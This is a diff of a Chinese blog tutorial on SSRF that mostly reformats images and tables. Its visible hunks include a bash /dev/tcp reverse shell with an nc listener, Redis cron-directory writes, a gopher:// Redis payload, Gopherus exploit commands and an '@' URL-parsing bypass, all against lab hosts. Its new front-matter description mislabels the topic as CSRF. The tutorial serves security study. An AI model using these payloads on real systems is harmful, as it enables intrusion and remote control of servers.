@@ -3,13 +3,15 @@ title: "SSRF漏洞详解"
 date: "2026-07-22"
 categories: ["未分类"]
 tags: ["SSRF"]
-description: "---"
+description: "CSRF：跨站请求伪造，客户端请求伪造"
 author: "Fan-SecLab"
 aside: right
 outline: [2, 3]
 ---
 
 # SSRF漏洞
+
+> 🎯 本文按「SSRF是什么 → SSRF漏洞原理 → pikachu简单示例 → SSRF漏洞挖掘 → URL地址分享网页内容 → 在线翻译：通过URL地址翻译对应文本的内容 → 图片、文章收藏功能 → 利用google语法加上这些关键字去寻找SSRF漏洞」的顺序整理，便于对照速查。
 
 ---
 
@@ -41,7 +43,7 @@ SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获
 
 pikachu靶场 → SSRF → SSRF(curl)
 
-<img src="/assets/images/ssrf/image-20260722204005503.png" alt="pikachu SSRF curl页面" style="zoom:50%;" />
+![pikachu SSRF curl页面](/assets/images/ssrf/image-20260722204005503.png)
 
 这时的url：
 
@@ -51,7 +53,7 @@ http://192.168.239.131/pikachu/vul/ssrf/ssrf_curl.php
 
 点击蓝色的字：
 
-<img src="/assets/images/ssrf/image-20260722204055236.png" alt="点击链接后" style="zoom:33%;" />
+![点击链接后](/assets/images/ssrf/image-20260722204055236.png)
 
 url变成了：
 
@@ -71,7 +73,7 @@ pikachu服务端请求了靶机上指定路径的文件。
 http://192.168.239.131/pikachu/vul/ssrf/ssrf_curl.php?url=https://www.baidu.com
 ```
 
-<img src="/assets/images/ssrf/image-20260722204433293.png" alt="通过SSRF访问百度" style="zoom:33%;" />
+![通过SSRF访问百度](/assets/images/ssrf/image-20260722204433293.png)
 
 ---
 
@@ -79,7 +81,7 @@ http://192.168.239.131/pikachu/vul/ssrf/ssrf_curl.php?url=https://www.baidu.com
 
 ### URL地址分享网页内容
 
-<img src="/assets/images/ssrf/image-20260723143413601.png" alt="QQ空间分享链接" style="zoom:33%;" />
+![QQ空间分享链接](/assets/images/ssrf/image-20260723143413601.png)
 
 这是分享的链接：
 
@@ -105,13 +107,13 @@ url=https://www.bilibili.com/video/BV1dr4y1n7vA/?vd_source=5382179cfb622c0c22a3e
 
 我们直接访问第一个url，发现可以直接访问成功：
 
-<img src="/assets/images/ssrf/image-20260723144755330.png" alt="直接访问URL" style="zoom:33%;" />
+![直接访问URL](/assets/images/ssrf/image-20260723144755330.png)
 
 说明这时浏览器发出的请求，不是服务端发出的请求，不存在SSRF漏洞。
 
 通过抓包我们也可以判断是从客户端发出的请求：
 
-<img src="/assets/images/ssrf/image-20260723152202763.png" alt="抓包确认客户端请求" style="zoom:33%;" />
+![抓包确认客户端请求](/assets/images/ssrf/image-20260723152202763.png)
 
 再看第二个。
 
@@ -121,7 +123,7 @@ url=https://www.bilibili.com/video/BV1dr4y1n7vA/?vd_source=5382179cfb622c0c22a3e
 https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=www.baidu.com&pics=http://i1.hdslb.com/bfs/archive/f9068917b672cfb7dd5e7772c7adc53b4ab0ba8b.jpg&style=203&width=98&height=22
 ```
 
-效果如下：发现并没有请求 `www.baidu.com`，只是把这个网址显示了出来，不存在SSRF。
+**效果如下**：发现并没有请求 `www.baidu.com`，只是把这个网址显示了出来，不存在SSRF。
 
 ![替换URL后的效果](/assets/images/ssrf/image-20260723150042593.png)
 
@@ -151,12 +153,12 @@ inurl:url
 
 关键字：
 
-| 关键字 | 关键字 | 关键字 |
-|--------|--------|--------|
-| share | wap | url |
-| link | src | source |
-| target | u | display |
-| sourceURl | imageURL | domain |
+| 关键字    | 关键字   | 关键字  |
+|-----------|----------|---------|
+| share     | wap      | url     |
+| link      | src      | source  |
+| target    | u        | display |
+| sourceURl | imageURL | domain  |
 
 > 🎯 所有目标服务器会从自身发起请求的功能点，且我们可以控制地址的参数，都可能造成SSRF漏洞。
 
@@ -397,7 +399,7 @@ systemctl stop firewalld
 redis-cli -h 192.168.239.140
 ```
 
-<img src="/assets/images/ssrf/image-20260723223717603.png" alt="kali连接redis" style="zoom:33%;" />
+![kali连接redis](/assets/images/ssrf/image-20260723223717603.png)
 
 ---
 
@@ -580,13 +582,13 @@ redis未授权访问漏洞就是因为没有设定连接密码或者密码太过
 
 #### 反弹shell
 
-监听机器：kali（`192.168.239.133`）
+**监听机器**：kali（`192.168.239.133`）
 
 ```bash
 nc -lvvp 4444
 ```
 
-目标主机：redis
+**目标主机**：redis
 
 ```bash
 /bin/bash -i>&/dev/tcp/192.168.239.133/4444 0>&1
@@ -608,7 +610,7 @@ centos存放定时任务的目录：`/var/spool/cron`
 config set dir /var/spool/cron
 ```
 
-<img src="/assets/images/ssrf/image-20260724230614484.png" alt="设置redis工作目录" style="zoom:33%;" />
+![设置redis工作目录](/assets/images/ssrf/image-20260724230614484.png)
 
 然后设置一个工作文件夹，必须是某个用户的名称，因为定时任务的文件名称是根据用户名称来的：
 
@@ -720,15 +722,15 @@ auth yourpassword
 
 当我们发现SSRF漏洞后，首先要做的事情就是测试所有可用的URL伪协议。
 
-| 协议 | 说明 |
-|------|------|
-| `http://` | 主要用于探测主机存活和端口的开放情况 |
-| `file:///` | 从文件系统中获取文件内容，如 `file:///etc/passwd` |
-| `dict://` | 字典服务器协议，访问字典资源，如 `dict://ip:6379/info` |
-| `gopher://` | 分布式文档传递服务，可使用gopherus生成payload |
-| `ftp://` | 针对21端口的探测 |
-| `sftp://` | SSH文件传输协议或安全文件传输协议 |
-| `ldap://` | 轻量级目录访问协议，windows 域控 |
+| 协议        | 说明                                                   |
+|-------------|--------------------------------------------------------|
+| `http://`   | 主要用于探测主机存活和端口的开放情况                   |
+| `file:///`  | 从文件系统中获取文件内容，如 `file:///etc/passwd`      |
+| `dict://`   | 字典服务器协议，访问字典资源，如 `dict://ip:6379/info` |
+| `gopher://` | 分布式文档传递服务，可使用gopherus生成payload          |
+| `ftp://`    | 针对21端口的探测                                       |
+| `sftp://`   | SSH文件传输协议或安全文件传输协议                      |
+| `ldap://`   | 轻量级目录访问协议，windows 域控                       |
 
 ---
 
@@ -921,7 +923,7 @@ redis的协议数据流格式：
 - `\n`：光标跳到下一行开头
 - `\r`：光标回到当前行最左端，不会下移行
 
-```
+```bash
 *<参数数量> CR LF
 $<参数 1 的字节数量> CR LF
 <参数 1 的数据> CR LF
@@ -932,7 +934,7 @@ $<参数 N 的字节数量> CR LF
 
 示例：
 
-```
+```bash
 *4
 $6
 config
@@ -948,17 +950,17 @@ gopher协议数据流写入操作，要将上面的数据转换为redis接受的
 
 > 🛠️ 直接帮我们生成gopher协议payload的工具：[Gopherus](https://github.com/tarunkant/Gopherus)
 
-| 命令 | 说明 |
-|------|------|
-| `python2 gopherus.py --exploit mysql` | MySQL 注入 |
-| `python2 gopherus.py --exploit postgresql` | PostgreSQL 注入 |
-| `python2 gopherus.py --exploit fastcgi` | FastCGI RCE |
-| `python2 gopherus.py --exploit redis` | Redis 写文件/反弹 Shell |
-| `python2 gopherus.py --exploit zabbix` | Zabbix 命令执行 |
-| `python2 gopherus.py --exploit smtp` | SMTP 伪造邮件 |
-| `python2 gopherus.py --exploit pymemcache` | Python Pickle 反序列化 |
-| `python2 gopherus.py --exploit phpmemcache` | PHP 反序列化 |
-| `python2 gopherus.py --exploit rbmemcache` | Ruby Marshal 反序列化 |
+| 命令                                        | 说明                    |
+|---------------------------------------------|-------------------------|
+| `python2 gopherus.py --exploit mysql`       | MySQL 注入              |
+| `python2 gopherus.py --exploit postgresql`  | PostgreSQL 注入         |
+| `python2 gopherus.py --exploit fastcgi`     | FastCGI RCE             |
+| `python2 gopherus.py --exploit redis`       | Redis 写文件/反弹 Shell |
+| `python2 gopherus.py --exploit zabbix`      | Zabbix 命令执行         |
+| `python2 gopherus.py --exploit smtp`        | SMTP 伪造邮件           |
+| `python2 gopherus.py --exploit pymemcache`  | Python Pickle 反序列化  |
+| `python2 gopherus.py --exploit phpmemcache` | PHP 反序列化            |
+| `python2 gopherus.py --exploit rbmemcache`  | Ruby Marshal 反序列化   |
 
 ---
 
@@ -990,7 +992,7 @@ gopher://192.168.239.140:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%
 
 解码数据流：
 
-```
+```bash
 *1
 $8
 flushall
@@ -1063,7 +1065,7 @@ nc -lvp 1234
 
 可以尝试采用http基本身份认证的方式绕过。
 
-如：`http://www.aaa.com@www.bbb.com@www.ccc.com`，在对 `@` 解析域名中，不同的处理函数存在处理差异：在PHP的 `parse_url` 中会识别 `www.ccc.com`，而 `libcurl` 则识别为 `www.bbb.com`。
+**如**：`http://www.aaa.com@www.bbb.com@www.ccc.com`，在对 `@` 解析域名中，不同的处理函数存在处理差异：在PHP的 `parse_url` 中会识别 `www.ccc.com`，而 `libcurl` 则识别为 `www.bbb.com`。
 
 ---
 
